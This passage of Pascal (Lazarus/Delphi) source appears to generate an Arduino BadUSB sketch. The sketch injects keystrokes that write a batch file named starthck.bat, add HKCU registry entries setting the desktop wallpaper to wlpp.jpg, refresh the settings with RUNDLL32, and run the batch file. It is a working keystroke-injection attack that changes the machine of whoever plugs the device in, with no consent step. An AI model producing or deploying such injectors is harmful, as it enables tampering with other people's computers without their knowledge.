    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("wlpp.jpg");');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    (*****************************************)
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat reg add ");');
    Memo1.Append('     Keyboard.write(126);');//"
    Memo1.Append('     Keyboard.print("HKCU");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("control panel");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("desktop");');
    Memo1.Append('     Keyboard.write(126);');
    Memo1.Append('     Keyboard.print(" ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("v wallpaper ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("t REG_SZ ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("d ");');
    Memo1.Append('     Keyboard.write(126);');
    Memo1.Append('     Keyboard.write(126);');//"
    Memo1.Append('     Keyboard.print(" ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("f");');
    Memo1.Append('     Keyboard.write(176);');//ENTER
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat reg add ");');
    Memo1.Append('     Keyboard.write(126);');//"
    Memo1.Append('     Keyboard.print("HKCU");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("control panel");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("desktop");');
    Memo1.Append('     Keyboard.write(126);');
    Memo1.Append('     Keyboard.print(" ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("v wallpaper ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("t REG_SZ ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("d ");');
    Memo1.Append('     Keyboard.write(126);');
    Memo1.Append('     Keyboard.print("C");');
    Memo1.Append('     Keyboard.write(63);');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("Users");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("%username%");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("Desktop");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("wlpp.jpg");');
    Memo1.Append('     Keyboard.write(126);');//"
    Memo1.Append('     Keyboard.print(" ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("f");');
    Memo1.Append('     Keyboard.write(176);');//ENTER
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat ");');
    Memo1.Append('     Keyboard.print("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");');
    Memo1.Append('     Keyboard.write(176);');//ENTER
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat exit");');
    Memo1.Append('     Keyboard.write(176);');//ENTER
    Memo1.Append('     delay(200);');
    Memo1.Append('     Keyboard.print("starthck.bat");');
    Memo1.Append('     Keyboard.write(176);');//ENTER
    (*****************************************)
    Memo1.Append('     ok++;');
    Memo1.Append('}');
    Memo1.Append('}');
  end;
end;

procedure TForm1.Edit2Change(Sender: TObject);
begin

end;

procedure TForm1.FormCreate(Sender: TObject);
begin

end;

end.

